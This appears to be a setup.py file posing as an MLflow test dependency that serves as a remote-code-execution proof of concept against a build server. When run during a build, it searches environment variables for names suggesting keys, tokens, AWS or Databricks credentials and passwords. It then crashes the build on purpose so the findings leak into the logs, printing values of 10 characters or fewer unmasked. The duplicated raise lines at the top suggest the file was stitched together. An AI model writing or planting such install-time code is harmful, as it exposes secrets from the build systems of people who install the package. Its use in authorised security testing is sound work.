print("🚨🚨🚨 THIS IS THE NEW COMMIT 🚨🚨🚨")
raise Exception("🚨🚨🚨 BUILD_SERVER_RCE_PROOF 🚨🚨🚨")

import os
from setuptools import setup
print("🚨🚨🚨 THIS IS THE NEW COMMIT 🚨🚨🚨")

# 1. Gather our proof
proof = "🚨🚨🚨 BUILD_SERVER_RCE_PROOF 🚨🚨🚨\n"
proof += f"Working Directory: {os.getcwd()}\n"

# 2. Look for sensitive environment variables
secrets_found = {}
sensitive_keys = ['KEY', 'SECRET', 'TOKEN', 'AWS', 'DATABRICKS', 'PASSWORD', 'CREDENTIAL']
for k, v in os.environ.items():
    if any(x in k.upper() for x in sensitive_keys):
        secrets_found[k] = "***REDACTED***" if len(v) > 10 else v

proof += f"Sensitive ENV Vars Found: {secrets_found}\n"

# 3. INTENTIONALLY CRASH THE BUILD to leak the proof into the Databricks logs!
# This guarantees the proof is printed, bypassing any file system restrictions.
raise Exception(proof)

# This line will never be reached, but setup() is required for the file to be valid Python
setup(
    name="mlflow-test-dep",
    version="0.1",
    description="A test dependency"
)
